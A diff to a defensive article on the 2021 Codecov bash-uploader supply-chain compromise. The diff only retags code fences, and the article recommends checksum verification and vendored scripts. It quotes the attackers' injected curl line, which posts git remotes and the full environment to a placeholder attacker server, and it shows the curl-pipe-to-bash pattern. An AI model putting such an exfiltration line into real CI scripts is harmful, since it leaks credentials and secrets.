@@ -22,7 +22,7 @@ The service integrates with CI/CD platforms (GitHub Actions, GitLab CI, CircleCI
 
 The typical integration looked like:
 
-```bash
+```shell
 # Common pattern in CI configuration files
 bash <(curl -s https://codecov.io/bash)
 ```
@@ -37,7 +37,7 @@ On January 31, 2021, attackers gained access to Codecov's systems through a vuln
 
 The modification was subtle—a single line added to the script:
 
-```bash
+```shell
 curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://<attacker-server>/upload/v2
 ```
 
@@ -126,7 +126,7 @@ The attack persisted for approximately two months before detection. Detection oc
 
 The Codecov attack reignited discussion of the `curl | bash` pattern—piping a remote script directly into a shell for execution.
 
-```bash
+```shell
 # The dangerous pattern
 curl -s https://example.com/install.sh | bash
 
@@ -152,7 +152,7 @@ Organizations should move away from fetching and executing remote scripts withou
 
 **Download, verify, then execute:**
 
-```bash
+```shell
 # Download the script
 curl -o codecov.sh https://codecov.io/bash
 
@@ -166,7 +166,7 @@ bash codecov.sh
 
 **Pin to specific versions with checksums:**
 
-```bash
+```shell
 # Example with explicit version and verification
 CODECOV_VERSION="v0.1.0"
 CODECOV_SHA256="abc123..."
@@ -177,7 +177,7 @@ bash "bash-${CODECOV_VERSION}"
 
 **Use package managers when available:**
 
-```bash
+```shell
 # Install via package manager instead of curl | bash
 pip install codecov
 codecov
@@ -185,7 +185,7 @@ codecov
 
 **Use vendored copies:**
 
-```bash
+```shell
 # Commit a verified copy of the script to your repository
 # Execute the local copy rather than fetching remotely
 bash ./scripts/codecov-uploader.sh
